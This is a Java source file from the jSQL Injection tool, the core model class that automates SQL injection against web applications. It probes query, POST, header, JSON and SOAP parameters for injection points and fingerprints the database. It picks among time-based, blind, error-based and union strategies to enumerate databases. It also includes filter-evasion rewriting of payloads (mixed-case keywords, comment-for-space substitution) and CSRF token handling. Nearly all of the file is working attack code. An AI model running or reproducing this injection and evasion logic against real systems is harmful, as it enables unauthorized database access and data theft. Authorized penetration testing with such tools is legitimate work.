/*******************************************************************************
 * Copyhacked (H) 2012-2016.
 * This program and the accompanying materials
 * are made available under no term at all, use it like
 * you want, but share and discuss about it
 * every time possible with every body.
 * 
 * Contributors:
 *      ron190 at ymail dot com - initial implementation
 ******************************************************************************/
package com.jsql.model;

import java.io.DataOutputStream;
import java.io.IOException;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.nio.charset.Charset;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.security.PrivilegedActionException;
import java.util.AbstractMap.SimpleEntry;
import java.util.EnumMap;
import java.util.List;
import java.util.Map;
import java.util.regex.Matcher;
import java.util.regex.Pattern;
import java.util.stream.Stream;

import javax.security.auth.login.LoginException;

import org.apache.commons.lang3.StringUtils;
import org.apache.log4j.Logger;
import org.ietf.jgss.GSSException;
import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import org.w3c.dom.Document;

import com.jsql.i18n.I18n;
import com.jsql.model.accessible.DataAccess;
import com.jsql.model.accessible.RessourceAccess;
import com.jsql.model.bean.util.Header;
import com.jsql.model.bean.util.Interaction;
import com.jsql.model.bean.util.Request;
import com.jsql.model.exception.InjectionFailureException;
import com.jsql.model.exception.JSqlException;
import com.jsql.model.injection.JsonUtil;
import com.jsql.model.injection.SoapUtil;
import com.jsql.model.injection.method.MethodInjection;
import com.jsql.model.injection.strategy.StrategyInjection;
import com.jsql.model.injection.strategy.StrategyInjectionNormal;
import com.jsql.model.injection.vendor.Vendor;
import com.jsql.model.suspendable.SuspendableGetCharInsertion;
import com.jsql.model.suspendable.SuspendableGetVendor;
import com.jsql.util.AuthenticationUtil;
import com.jsql.util.ConnectionUtil;
import com.jsql.util.GitUtil.ShowOnConsole;
import com.jsql.util.HeaderUtil;
import com.jsql.util.ParameterUtil;
import com.jsql.util.PreferencesUtil;
import com.jsql.util.ProxyUtil;
import com.jsql.util.ThreadUtil;

import net.sourceforge.spnego.SpnegoHttpURLConnection;

/**
 * Model class of MVC pattern for processing SQL injection automatically.<br>
 * Different views can be attached to this observable, like Swing or command line, in order to separate
 * the functional job from the graphical processing.<br>
 * The Model has a specific database vendor and strategy which run an automatic injection to get name of
 * databases, tables, columns and values, and it can also retreive resources like files and shell.<br>
 * Tasks are run in multi-threads in general to speed the process.
 */
public class InjectionModel extends AbstractModelObservable {
	
    /**
     * Log4j logger sent to view.
     */
    private static final Logger LOGGER = Logger.getRootLogger();
    
    /**
     * Current version of application.
     */
    private static final String VERSION_JSQL = "0.81";
    
    public static final String STAR = "*";
    
    // TODO Pojo injection
    /**
     * HTML body of page successfully responding to
     * multiple fields selection (select 1,2,3,..).
     */
    private String srcSuccess = "";
    
    /**
     * initialUrl transformed to a correct injection url.
     */
    private String indexesInUrl = "";

    /**
     * Current version of database.
     */
    private String versionDatabase;
    
    /**
     * Selected database.
     */
    private String nameDatabase;
    
    /**
     * User connected to database.
     */
    private String username;
    
    /**
     * Database vendor currently used.
     * It can be switched to another vendor by automatic detection or manual selection.
     */
    private Vendor vendor = Vendor.MYSQL;

    /**
     * Database vendor selected by user (default UNDEFINED).
     * If not UNDEFINED then the next injection will be forced to use the selected vendor.
     */
    private Vendor vendorByUser = Vendor.AUTO;
    
    /**
     * Current injection strategy.
     */
    private StrategyInjection strategy;
    
    /**
     * Allow to directly start an injection after a failed one
     * without asking the user 'Start a new injection?'.
     */
    private boolean injectionAlreadyBuilt = false;
    
    private boolean isScanning = false;
    
    private static final boolean IS_PARAM_BY_USER = true;
    private static final boolean IS_JSON = true;

    /**
     * Current evasion step, 0 is 'no evasion'
     */
    private int stepSecurity = 0;
    
    /**
     * Reset each injection attributes: Database metadata, General Thread status, Strategy.
     */
    public void resetModel() {
        // TODO make injection pojo for all fields
        ((StrategyInjectionNormal) StrategyInjection.NORMAL.instance()).setVisibleIndex(null);
        this.indexesInUrl = "";
        
        ConnectionUtil.setTokenCsrf(null);
        
        this.versionDatabase = null;
        this.nameDatabase = null;
        this.username = null;
        
        this.setIsStoppedByUser(false);
        this.injectionAlreadyBuilt = false;
        
        this.strategy = null;
        
        RessourceAccess.setReadingIsAllowed(false);
        
        ThreadUtil.reset();
    }

    /**
     * Prepare the injection process, can be interrupted by the user (via shouldStopAll).
     * Erase all attributes eventually defined in a previous injection.
     * Run by Scan, Standard and TU.
     */
    public void beginInjection() {
        this.resetModel();
        
        // TODO Extract in method
        try {
            // Test proxy connection
            if (!ProxyUtil.isChecked(ShowOnConsole.YES)) {
                return;
            }
            
            LOGGER.info(I18n.valueByKey("LOG_START_INJECTION") +": "+ ConnectionUtil.getUrlByUser());
            
            // Check general integrity if user's parameters
            ParameterUtil.checkParametersFormat(true, true, null);
            
            // Check connection is working: define Cookie management, check HTTP status, parse <form> parameters, process CSRF
            LOGGER.trace(I18n.valueByKey("LOG_CONNECTION_TEST"));
            ConnectionUtil.testConnection();
            
            boolean hasFoundInjection = false;
            
            // Try to inject Query params
            hasFoundInjection = this.testParameters(MethodInjection.QUERY, ParameterUtil.getQueryStringAsString(), ParameterUtil.getQueryString());

            if (!hasFoundInjection) {
                if (
                    PreferencesUtil.isCheckingAllSOAPParam()
                    && ParameterUtil.getRequestAsText().matches("^<\\?xml.*")
                ) {
                    try {
                        Document doc = SoapUtil.convertStringToDocument(ParameterUtil.getRequestAsText());
                        LOGGER.trace("Parsing SOAP from Request...");
                        hasFoundInjection = SoapUtil.injectTextNodes(doc, doc.getDocumentElement());
                    } catch (Exception e) {
                        LOGGER.trace("SOAP not detected, checking standard Request parameters...");
                        
                        // Try to inject Request params
                        hasFoundInjection = this.testParameters(MethodInjection.REQUEST, ParameterUtil.getRequestAsString(), ParameterUtil.getRequest());
                    }
                } else {
                    LOGGER.trace("Checking standard Request parameters");
                    
                    // Try to inject Request params
                    hasFoundInjection = this.testParameters(MethodInjection.REQUEST, ParameterUtil.getRequestAsString(), ParameterUtil.getRequest());
                }
            }
            
            if (!hasFoundInjection) {
                // Try to inject Header params
                hasFoundInjection = this.testParameters(MethodInjection.HEADER, ParameterUtil.getHeaderAsString(), ParameterUtil.getHeader());
            }
            
            LOGGER.trace(I18n.valueByKey("LOG_DONE"));
            this.injectionAlreadyBuilt = true;
        } catch (JSqlException e) {
            LOGGER.warn(e.getMessage(), e);
        } finally {
            Request request = new Request();
            request.setMessage(Interaction.END_PREPARATION);
            this.sendToViews(request);
        }
    }
    
    /**
     * Verify if injection works for specific Method using 3 modes: standard (last param), injection point
     * and full params injection. Special injections like JSON and SOAP are checked.
     * @param methodInjection currently tested (Query, Request or Header)
     * @param paramsAsString to verify if contains injection point
     * @param params from Query, Request or Header as a list of key/value to be tested for insertion character ;
     * Mode standard: last param, mode injection point: no test, mode full: every params.
     * @return true if injection didn't failed
     * @throws JSqlException when no params' integrity, process stopped by user, or injection failure
     */
    public boolean testParameters(MethodInjection methodInjection, String paramsAsString, List<SimpleEntry<String, String>> params) throws JSqlException {
        boolean hasFoundInjection = false;
        
        // Injects URL, Request or Header params only if user tests every params
        // or method is selected by user.
        if (
            !PreferencesUtil.isCheckingAllParam()
            && ConnectionUtil.getMethodInjection() != methodInjection
        ) {
            return hasFoundInjection;
        }
        
        // Force injection method of model to current running method
        ConnectionUtil.setMethodInjection(methodInjection);
        
        // Default injection: last param tested only and no injection point
        if (!methodInjection.isCheckingAllParam() && !paramsAsString.contains(InjectionModel.STAR)) {
            // Injection point defined on last parameter
            params.stream().reduce((a, b) -> b).ifPresent(e -> e.setValue(e.getValue() + InjectionModel.STAR));

            // Will check param value by user.
            // Notice options 'Inject each URL params' and 'inject JSON' must be checked both
            // for JSON injection of last param
            hasFoundInjection = this.testStrategies(IS_PARAM_BY_USER, !IS_JSON, params.stream().reduce((a, b) -> b).get());
            
        // Injection by injection point
        } else if (paramsAsString.contains(InjectionModel.STAR)) {
            LOGGER.info("Checking single "+ methodInjection.name() +" parameter with injection point at *");
            
            // Will keep param value as is,
            // Does not test for insertion character (param is null)
            hasFoundInjection = this.testStrategies(!IS_PARAM_BY_USER, !IS_JSON, null);
            
        // Injection of every params: isCheckingAllParam() == true.
        // Params are tested one by one in two loops:
        //  - inner loop erases * from previous param
        //  - outer loop adds * to current param
        } else {
            
            // This param will be marked by * if injection is found,
            // inner loop will erase mark * otherwise
            for (SimpleEntry<String, String> paramBase: params) {

                // This param is the current tested one.
                // For JSON value attributes are traversed one by one to test every values.
                // For standard value mark * is simply added to the end of its value.
                for (SimpleEntry<String, String> paramStar: params) {
                    if (paramStar == paramBase) {
                        
                        // Will test if current value is a JSON entity
                        Object jsonEntity = null;
                        try {
                            // Test for JSON Object: {...}
                            jsonEntity = new JSONObject(paramStar.getValue());
                        } catch (JSONException exceptionJSONObject) {
                            try {
                                // Test for JSON Array: [...]
                                jsonEntity = new JSONArray(paramStar.getValue());
                            } catch (JSONException exceptionJSONArray) {
                                // Not a JSON entity
                            }
                        }
                        
                        // Define a tree of JSON attributes with path as the key: root.a => value of a
                        List<SimpleEntry<String, String>> attributesJson = JsonUtil.loopThroughJson(jsonEntity, "root", null);

                        // When option 'Inject JSON' is selected and there's a JSON entity to inject
                        // then loop through each paths to add * at the end of value and test each strategies.
                        // Marks * are erased between each tests.
                        if (PreferencesUtil.isCheckingAllJSONParam() && !attributesJson.isEmpty()) {
                            
                            // Loop through each JSON values
                            for (SimpleEntry<String, String> parentXPath: attributesJson) {
                                
                                // Erase previously defined *
                                JsonUtil.loopThroughJson(jsonEntity, "root", null);
                                
                                // Add * to current parameter's value
                                JsonUtil.loopThroughJson(jsonEntity, "root", parentXPath);
                                
                                // Replace param value by marked one.
                                // paramStar and paramBase are the same object
                                paramStar.setValue(jsonEntity.toString());
                                
                                try {
                                    LOGGER.info("Checking JSON "+ methodInjection.name() +" parameter "+ parentXPath.getKey() +"="+ parentXPath.getValue().replace(InjectionModel.STAR, ""));
                                    
                                    // Test current JSON value marked with * for injection
                                    // Keep original param
                                    hasFoundInjection = this.testStrategies(IS_PARAM_BY_USER, IS_JSON, paramBase);
                                    
                                    // Injection successful
                                    break;
                                    
                                } catch (JSqlException e) {
                                    // Injection failure
                                    LOGGER.warn("No "+ methodInjection.name() +" injection found for JSON "+ methodInjection.name() +" parameter "+ parentXPath.getKey() +"="+ parentXPath.getValue().replace(InjectionModel.STAR, ""), e);
                                    
                                } finally {
                                    // Erase * at the end of each params
                                    params.stream().forEach(e -> e.setValue(e.getValue().replaceAll(Pattern.quote(InjectionModel.STAR) +"$", "")));
                                    
                                    // Erase * from JSON if failure
                                    if (!hasFoundInjection) {
                                        paramStar.setValue(paramStar.getValue().replace("*", ""));
                                    }
                                }
                            }
                        // Standard non JSON injection
                        } else {
                            // Add * to end of value
                            paramStar.setValue(paramStar.getValue() + InjectionModel.STAR);
                            
                            try {
                                LOGGER.info("Checking "+ methodInjection.name() +" parameter "+ paramBase.getKey() +"="+ paramBase.getValue().replace(InjectionModel.STAR, ""));
                                
                                // Test current standard value marked with * for injection
                                // Keep original param
                                hasFoundInjection = this.testStrategies(IS_PARAM_BY_USER, !IS_JSON, paramBase);
                                
                                // Injection successful
                                break;
                                
                            } catch (JSqlException e) {
                                // Injection failure
                                LOGGER.warn(
                                    "No "+ methodInjection.name() +" injection found for parameter "
                                    + paramBase.getKey() +"="+ paramBase.getValue().replace(InjectionModel.STAR, "")
                                    + " (" + e.getMessage() +")", e
                                );
                                
                            } finally {
                                // Erase * at the end of each params
                                params.stream().forEach(e -> e.setValue(e.getValue().replaceAll(Pattern.quote(InjectionModel.STAR) +"$", "")));
                            }
                        }
                        
                    }
                }
                
                // If injection successful then add * at the end of value
                if (hasFoundInjection) {
                    paramBase.setValue(paramBase.getValue().replace("*", "") +"*");
                    break;
                }
                
            }
        }
        
        return hasFoundInjection;
    }
    
    /**
     * Find the insertion character, test each strategy, inject metadata and list databases.
     * @param isParamByUser true if mode standard/JSON/full, false if injection point
     * @param isJson true if param contains JSON
     * @param parameter to be tested, null when injection point
     * @return true when successful injection
     * @throws JSqlException when no params' integrity, process stopped by user, or injection failure
     */
    // TODO Merge isParamByUser and parameter: isParamByUser = parameter != null
    private boolean testStrategies(boolean isParamByUser, boolean isJson, SimpleEntry<String, String> parameter) throws JSqlException {
        // Define insertionCharacter, i.e, -1 in "[..].php?id=-1 union select[..]",
        LOGGER.trace(I18n.valueByKey("LOG_GET_INSERTION_CHARACTER"));
        
        // Test for params integrity
        String characterInsertionByUser = ParameterUtil.checkParametersFormat(false, isParamByUser, parameter);
        
        // If not an injection point then find insertion character.
        // Force to 1 if no insertion char works and empty value from user,
        // Force to user's value if no insertion char works,
        // Force to insertion char otherwise.
        if (parameter != null) {
            String charInsertion = new SuspendableGetCharInsertion().run(characterInsertionByUser, parameter, isJson);
            LOGGER.info(I18n.valueByKey("LOG_USING_INSERTION_CHARACTER") +" ["+ charInsertion.replace(InjectionModel.STAR, "") +"]");
        }
        
        // Fingerprint database
        this.vendor = new SuspendableGetVendor().run();

        // Test each injection strategies: time, blind, error, normal
        StrategyInjection.TIME.instance().checkApplicability();
        StrategyInjection.BLIND.instance().checkApplicability();
        StrategyInjection.ERROR.instance().checkApplicability();
        StrategyInjection.NORMAL.instance().checkApplicability();

        // Choose the most efficient strategy: normal > error > blind > time
        if (StrategyInjection.NORMAL.instance().isApplicable()) {
            StrategyInjection.NORMAL.instance().activateStrategy();
            
        } else if (StrategyInjection.ERROR.instance().isApplicable()) {
            StrategyInjection.ERROR.instance().activateStrategy();
            
        } else if (StrategyInjection.BLIND.instance().isApplicable()) {
            StrategyInjection.BLIND.instance().activateStrategy();
            
        } else if (StrategyInjection.TIME.instance().isApplicable()) {
            StrategyInjection.TIME.instance().activateStrategy();
            
        } else if (PreferencesUtil.isEvasionEnabled() && this.stepSecurity < 3) {
            // No injection possible, increase evasion level and restart whole process
            this.stepSecurity++;

            LOGGER.warn("Injection failed, testing evasion level "+ this.stepSecurity +"...");
            
            Request request = new Request();
            request.setMessage(Interaction.RESET_STRATEGY_LABEL);
            this.sendToViews(request);
            
            // sinon perte de insertionCharacter entre 2 injections
//            ConnectionUtil.setQueryString(ConnectionUtil.getQueryString() + this.charInsertion);
            this.beginInjection();
            
            return false;
        } else {
            throw new InjectionFailureException("No injection found");
        }

        if (!this.isScanning) {
            if (!PreferencesUtil.isNotInjectingMetadata()) {
                DataAccess.getDatabaseInfos();
            }
            DataAccess.listDatabases();
        }
        
        return true;
    }
    
    /**
     * Run a HTTP connection to the web server.
     * @param dataInjection SQL query
     * @param responseHeader unused
     * @return source code of current page
     */
    @Override
    public String inject(String newDataInjection, boolean isUsingIndex) {
        // Temporary url, we go from "select 1,2,3,4..." to "select 1,([complex query]),2...", but keep initial url
        String urlInjection = ConnectionUtil.getUrlBase();
        
        String dataInjection = " "+ newDataInjection;
        
        urlInjection = this.buildURL(urlInjection, isUsingIndex, dataInjection);

        // TODO merge into function
        urlInjection = urlInjection
            .trim()
            // Remove comments
            .replaceAll("(?s)/\\*.*?\\*/", "")
            // Remove spaces after a word
            .replaceAll("([^\\s\\w])(\\s+)", "$1")
            // Remove spaces before a word
            .replaceAll("(\\s+)([^\\s\\w])", "$2")
            // Replace spaces
            .replaceAll("\\s+", "+");

        URL urlObject = null;
        try {
            urlObject = new URL(urlInjection);
        } catch (MalformedURLException e) {
            LOGGER.warn("Incorrect Query Url: "+ e.getMessage(), e);
            return "";
        }

        /**
         * Build the GET query string infos
         * Add primary evasion
         * TODO separate method
         */
        // TODO Extract in method
        if (!ParameterUtil.getQueryString().isEmpty()) {
            // URL without querystring like Request and Header can receive
            // new params from <form> parsing, in that case add the '?' to URL
            if (!urlInjection.contains("?")) {
                urlInjection += "?";
            }
            
            urlInjection += this.buildQuery(MethodInjection.QUERY, ParameterUtil.getQueryStringAsString(), isUsingIndex, dataInjection);
            
            if (ConnectionUtil.getTokenCsrf() != null) {
                urlInjection += "&"+ ConnectionUtil.getTokenCsrf().getKey() +"="+ ConnectionUtil.getTokenCsrf().getValue();
            }
            
            try {
                // Evasion
                if (this.stepSecurity == 1) {
                    // Replace character '+'
                    urlInjection = urlInjection
                        .replaceAll("--\\+", "--")
                        .replaceAll("7330%2b1", "7331");
                    
                } else if (this.stepSecurity == 2) {
                    // Change case
                    urlInjection = urlInjection
                        .replaceAll("union\\+", "uNiOn+")
                        .replaceAll("select\\+", "sElEcT+")
                        .replaceAll("from\\+", "FrOm+")
                        .replaceAll("from\\(", "FrOm(")
                        .replaceAll("where\\+", "wHeRe+")
                        .replaceAll("([AE])=0x", "$1+lIkE+0x");
                    
                } else if (this.stepSecurity == 3) {
                    // Change Case and Space
                    urlInjection = urlInjection
                        .replaceAll("union\\+", "uNiOn/**/")
                        .replaceAll("select\\+", "sElEcT/**/")
                        .replaceAll("from\\+", "FrOm/**/")
                        .replaceAll("from\\(", "FrOm(")
                        .replaceAll("where\\+", "wHeRe/**/")
                        .replaceAll("([AE])=0x", "$1/**/lIkE/**/0x");
                    urlInjection = urlInjection
                        .replaceAll("--\\+", "--")
                        .replaceAll("\\+", "/**/");
                }

                urlObject = new URL(urlInjection);
            } catch (MalformedURLException e) {
                LOGGER.warn("Incorrect Evasion Url: "+ e.getMessage(), e);
            }
        } else {
            if (ConnectionUtil.getTokenCsrf() != null) {
                urlInjection += "?"+ ConnectionUtil.getTokenCsrf().getKey() +"="+ ConnectionUtil.getTokenCsrf().getValue();
            }
        }
        
        HttpURLConnection connection;
        String pageSource = "";
        
        // Define the connection
        try {
            
            // TODO separate method
            // Block Opening Connection
            if (AuthenticationUtil.isKerberos()) {
                String kerberosConfiguration =
                    Pattern
                        .compile("(?s)\\{.*")
                        .matcher(StringUtils.join(Files.readAllLines(Paths.get(AuthenticationUtil.getPathKerberosLogin()), Charset.defaultCharset()), ""))
                        .replaceAll("")
                        .trim();
                
                SpnegoHttpURLConnection spnego = new SpnegoHttpURLConnection(kerberosConfiguration);
                connection = spnego.connect(urlObject);
            } else {
                connection = (HttpURLConnection) urlObject.openConnection();
            }
            
            connection.setReadTimeout(ConnectionUtil.getTimeout());
            connection.setConnectTimeout(ConnectionUtil.getTimeout());
            connection.setDefaultUseCaches(false);
            
            connection.setRequestProperty("Pragma", "no-cache");
            connection.setRequestProperty("Cache-Control", "no-cache");
            connection.setRequestProperty("Expires", "-1");
            
            // Csrf
            
            if (ConnectionUtil.getTokenCsrf() != null) {
                connection.setRequestProperty(ConnectionUtil.getTokenCsrf().getKey(), ConnectionUtil.getTokenCsrf().getValue());
            }
            
            ConnectionUtil.fixJcifsTimeout(connection);

            Map<Header, Object> msgHeader = new EnumMap<>(Header.class);
            msgHeader.put(Header.URL, urlInjection);
            
            /**
             * Build the HEADER and logs infos
             * #Need primary evasion
             */
            // TODO Extract in method
            if (!ParameterUtil.getHeader().isEmpty()) {
                Stream.of(this.buildQuery(MethodInjection.HEADER, ParameterUtil.getHeaderAsString(), isUsingIndex, dataInjection).split("\\\\r\\\\n"))
                .forEach(e -> {
                    if (e.split(":").length == 2) {
                        HeaderUtil.sanitizeHeaders(connection, new SimpleEntry<String, String>(e.split(":")[0], e.split(":")[1]));
                    }
                });
                
                msgHeader.put(Header.HEADER, this.buildQuery(MethodInjection.HEADER, ParameterUtil.getHeaderAsString(), isUsingIndex, dataInjection));
            }
    
            /**
             * Build the POST and logs infos
             * #Need primary evasion
             * TODO separate method
             */
            // TODO Extract in method
            if (!ParameterUtil.getRequest().isEmpty() || ConnectionUtil.getTokenCsrf() != null) {
                try {
                    ConnectionUtil.fixCustomRequestMethod(connection, ConnectionUtil.getTypeRequest());
                    
                    connection.setDoOutput(true);
                    connection.addRequestProperty("Content-Type", "application/x-www-form-urlencoded");
    
                    DataOutputStream dataOut = new DataOutputStream(connection.getOutputStream());
                    if (ConnectionUtil.getTokenCsrf() != null) {
                        dataOut.writeBytes(ConnectionUtil.getTokenCsrf().getKey() +"="+ ConnectionUtil.getTokenCsrf().getValue() +"&");
                    }
                    if (ConnectionUtil.getTypeRequest().matches("PUT|POST")) {
                        if (ParameterUtil.getRequestAsText().trim().matches("^<\\?xml.*")) {
                            dataOut.writeBytes(this.buildQuery(MethodInjection.REQUEST, ParameterUtil.getRequestAsText(), isUsingIndex, dataInjection));
                        } else {
                            dataOut.writeBytes(this.buildQuery(MethodInjection.REQUEST, ParameterUtil.getRequestAsString(), isUsingIndex, dataInjection));
                        }
                    }
                    dataOut.flush();
                    dataOut.close();
                    
                    if (ParameterUtil.getRequestAsText().trim().matches("^<\\?xml.*")) {
                        msgHeader.put(Header.POST, this.buildQuery(MethodInjection.REQUEST, ParameterUtil.getRequestAsText(), isUsingIndex, dataInjection));
                    } else {
                        msgHeader.put(Header.POST, this.buildQuery(MethodInjection.REQUEST, ParameterUtil.getRequestAsString(), isUsingIndex, dataInjection));
                    }
                } catch (IOException e) {
                    LOGGER.warn("Error during Request connection: "+ e.getMessage(), e);
                }
            }
            
            msgHeader.put(Header.RESPONSE, HeaderUtil.getHttpHeaders(connection));
            
            try {
                pageSource = ConnectionUtil.getSource(connection);
            } catch (Exception e) {
                LOGGER.error(e, e);
            }
            
            // Calling connection.disconnect() is not required, further calls will follow
            
            msgHeader.put(Header.SOURCE, pageSource);
            
            // Inform the view about the log infos
            Request request = new Request();
            request.setMessage(Interaction.MESSAGE_HEADER);
            request.setParameters(msgHeader);
            this.sendToViews(request);
            
        } catch (
            // Exception for General and Spnego Opening Connection
            IOException | LoginException | GSSException | PrivilegedActionException e
        ) {
            LOGGER.warn("Error during connection: "+ e.getMessage(), e);
        }

        // return the source code of the page
        return pageSource;
    }
    
    /**
     * Build correct data for GET, POST, HEADER.<br>
     * Each can be:<br>
     *  - raw data (no injection)<br>
     *  - SQL query without index requirement<br>
     *  - SQL query with index requirement.
     * @param dataType Current method to build
     * @param urlBase Beginning of the request data
     * @param isUsingIndex False if request doesn't use indexes
     * @param sqlTrail SQL statement
     * @return Final data
     */
    private String buildURL(String urlBase, boolean isUsingIndex, String sqlTrail) {
        if (urlBase.contains(InjectionModel.STAR)) {
            if (!isUsingIndex) {
                return urlBase.replace(InjectionModel.STAR, sqlTrail);
            } else {
                return
                    urlBase.replace(
                        InjectionModel.STAR,
                        this.indexesInUrl.replaceAll(
                            "1337" + ((StrategyInjectionNormal) StrategyInjection.NORMAL.instance()).getVisibleIndex() + "7331",
                            /**
                             * Oracle column often contains $, which is reserved for regex.
                             * => need to be escape with quoteReplacement()
                             */
                            Matcher.quoteReplacement(sqlTrail)
                        )
                    )
                ;
            }
        }
        return urlBase;
    }
    
    private String buildQuery(MethodInjection methodInjection, String paramLead, boolean isUsingIndex, String sqlTrail) {
        String query;
        
        // TODO simplify
        if (
            // No parameter transformation if method is not selected by user
            ConnectionUtil.getMethodInjection() != methodInjection
            // No parameter transformation if injection point in URL
            || ConnectionUtil.getUrlBase().contains(InjectionModel.STAR)
        ) {
            // Just pass parameters without any transformation
            query = paramLead;
            
        } else if (
                
            // If method is selected by user and URL does not contains injection point
            // but parameters contain an injection point
            // then replace injection point by SQL expression in those parameter
            paramLead.contains(InjectionModel.STAR)
        ) {
            // Several SQL expressions does not use indexes in SELECT,
            // like Boolean, Error, Shell and search for Insertion character,
            // in that case replace injection point by SQL expression.
            // Injection point is always at the end?
            if (!isUsingIndex) {
//                query = paramLead.replace(InjectionModel.STAR, sqlTrail);
                query = paramLead.replace(InjectionModel.STAR, sqlTrail + this.vendor.instance().endingComment());
                
                // Add ending line comment by vendor
//                query = query + this.vendor.instance().endingComment();
                
            } else {
                // Replace injection point by indexes found for Normal strategy
                // and use visible Index for injection
                query = paramLead.replace(
                    InjectionModel.STAR,
                    this.indexesInUrl.replaceAll(
                        "1337" + ((StrategyInjectionNormal) StrategyInjection.NORMAL.instance()).getVisibleIndex() + "7331",
                        /**
                         * Oracle column often contains $, which is reserved for regex.
                         * => need to be escape with quoteReplacement()
                         */
                        Matcher.quoteReplacement(sqlTrail)
//                        Matcher.quoteReplacement(sqlTrail) + this.vendor.instance().endingComment()
//                    )
                    ) + this.vendor.instance().endingComment()
                );
                
                // Add ending line comment by vendor
//                query = query + this.vendor.instance().endingComment();
            }
            
        } else {
            // Method is selected by user and there's no injection point
            if (
                // Several SQL expressions does not use indexes in SELECT,
                // like Boolean, Error, Shell and search for Insertion character,
                // in that case concat SQL expression to the end of param.
                !isUsingIndex
            ) {
                query = paramLead + sqlTrail;
                
                // Add ending line comment by vendor
                query = query + this.vendor.instance().endingComment();
                
            } else {
                // Concat indexes found for Normal strategy to params
                // and use visible Index for injection
                query = paramLead + this.indexesInUrl.replaceAll(
                    "1337" + ((StrategyInjectionNormal) StrategyInjection.NORMAL.instance()).getVisibleIndex() + "7331",
                    /**
                     * Oracle column often contains $, which is reserved for regex.
                     * => need to be escape with quoteReplacement()
                     */
                    Matcher.quoteReplacement(sqlTrail)
                );
                
                // Add ending line comment by vendor
                query = query + this.vendor.instance().endingComment();
            }
        }
        
        // TODO merge into function
        
        // Remove SQL comments
        query = query.replaceAll("(?s)/\\*.*?\\*/", "");
        
        if (methodInjection == MethodInjection.REQUEST) {
            if (
                ParameterUtil.getRequestAsText().matches("^<\\?xml.*")
//                && SoapUtil.convertStringToDocument(query) != null
            ) {
                query = query.replaceAll("%2b", "+");
            }
        } else {
            // Remove spaces after a word
            query = query.replaceAll("([^\\s\\w])(\\s+)", "$1");
            
            // Remove spaces before a word
            query = query.replaceAll("(\\s+)([^\\s\\w])", "$2");
            
            // Replace spaces
            query = query.replaceAll("\\s+", "+");
        }
        
        query = query.trim();
        
        return query;
    }
    
    /**
     * Display source code in console.
     * @param message Error message
     * @param source Text to display in console
     */
    public void sendResponseFromSite(String message, String source) {
        LOGGER.warn(message + ", response from site:");
        LOGGER.warn(">>>" + source);
    }

    /**
     * Send each parameters from the GUI to the model in order to
     * start the preparation of injection, the injection process is
     * started in a new thread via model function inputValidation().
     */
    public void controlInput(
        String urlQuery,
        String dataRequest,
        String dataHeader,
        MethodInjection methodInjection,
        String typeRequest,
        Boolean isScanning
    ) {
        try {
                
            if (!urlQuery.isEmpty() && !urlQuery.matches("(?i)^https?://.*")) {
                if (!urlQuery.matches("(?i)^\\w+://.*")) {
                    LOGGER.info("Undefined URL protocol, forcing to [http://]");
                    urlQuery = "http://"+ urlQuery;
                } else {
                    throw new MalformedURLException("unknown URL protocol");
                }
            }
                     
            ParameterUtil.initQueryString(urlQuery);
            ParameterUtil.initRequest(dataRequest);
            ParameterUtil.initHeader(dataHeader);
            
            ConnectionUtil.setMethodInjection(methodInjection);
            ConnectionUtil.setTypeRequest(typeRequest);
            
            // Reset level of evasion
            this.stepSecurity = 0;
            
            // TODO separate method
            if (isScanning) {
                this.beginInjection();
            } else {
                // Start the model injection process in a thread
                new Thread(InjectionModel.this::beginInjection, "ThreadBeginInjection").start();
            }
        } catch (MalformedURLException e) {
            LOGGER.warn("Incorrect Url: "+ e.getMessage(), e);
            
            // Incorrect URL, reset the start button
            Request request = new Request();
            request.setMessage(Interaction.END_PREPARATION);
            this.sendToViews(request);
        }
    }
    
    // TODO Util
    public void displayVersion() {
        String versionJava = System.getProperty("java.version");
        String nameSystemArchitecture = System.getProperty("os.arch");
        LOGGER.trace(
            "jSQL Injection v" + VERSION_JSQL
            + " on Java "+ versionJava
            +"-"+ nameSystemArchitecture
            +"-"+ System.getProperty("user.language")
        );
    }
    
    public String getDatabaseInfos() {
        return
    		"Database ["+ this.nameDatabase +"] "
            + "on "+ this.vendor +" ["+ this.versionDatabase +"] "
            + "for user ["+ this.username +"]";
    }

    public void setDatabaseInfos(String versionDatabase, String nameDatabase, String username) {
        this.versionDatabase = versionDatabase;
        this.nameDatabase = nameDatabase;
        this.username = username;
    }
    
    // Getters and setters
    
    public Vendor getVendor() {
        return this.vendor;
    }

    public Vendor getVendorByUser() {
        return this.vendorByUser;
    }

    public void setVendorByUser(Vendor vendorByUser) {
        this.vendorByUser = vendorByUser;
    }
    
    public StrategyInjection getStrategy() {
    	return this.strategy;
    }

    public void setStrategy(StrategyInjection strategy) {
        this.strategy = strategy;
    }

    public String getSrcSuccess() {
        return this.srcSuccess;
    }

    public void setSrcSuccess(String srcSuccess) {
        this.srcSuccess = srcSuccess;
    }

    public String getIndexesInUrl() {
        return this.indexesInUrl;
    }

    public void setIndexesInUrl(String indexesInUrl) {
        this.indexesInUrl = indexesInUrl;
    }

    public boolean isInjectionAlreadyBuilt() {
        return this.injectionAlreadyBuilt;
    }

    public void setIsScanning(boolean isScanning) {
        this.isScanning = isScanning;
    }

    public static String getVersionJsql() {
        return VERSION_JSQL;
    }

    public int getStepSecurity() {
        return this.stepSecurity;
    }

}
